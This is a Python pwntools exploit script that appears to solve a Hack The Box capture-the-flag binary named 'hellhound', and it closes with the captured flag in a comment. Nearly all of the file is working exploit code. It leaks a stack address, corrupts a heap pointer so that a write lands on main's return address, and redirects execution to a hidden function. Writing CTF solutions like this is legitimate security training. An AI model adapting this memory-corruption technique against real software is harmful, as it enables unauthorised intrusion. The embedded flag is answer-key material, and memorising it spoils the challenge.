#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('hellhound')


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote("1.1.1.1",31374)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
break main
continue
'''.format(**locals())

io = start()
io.recvuntil(b">> ")
io.sendline(b"1")

# Get stack addr
io.recvuntil(b"serial number: [")
stack_addr = int(io.recvuntil(b"]").strip()[:-1])
log.info("Stack addr: " + hex(stack_addr))

# Write to heap buffer
io.recvuntil(b">>")
io.sendline(b"2")
io.recvuntil(b"some code: ")

stack_addr = stack_addr + 0x50 # return address for main 
log.info("Writing to " + hex(stack_addr))
payload = b"A"*8 + p64(stack_addr)
io.sendline(payload)

# Call option 3 to overwrite ptr to heap buffer with ptr to stack addr
io.recvuntil(b">>")
io.sendline(b"3")
io.recvuntil(b">>")

# Write to stack addr
io.sendline(b"2")
io.recvuntil(b"some code: ")

# 0x400977 <berserk_mode_off>
payload = p64(0x400977) + p64(0)
io.sendline(payload)

# Increment &buf to null ptr
io.recvuntil(b">>")
io.sendline(b"3")

# Call free(0) and then return to berserk_mode_off
io.recvuntil(b">>")
io.sendline(b"69")
io.interactive()

# HTB{1t5_5p1r1t_15_5tr0ng3r_th4n_m0d1f1c4t10n5}

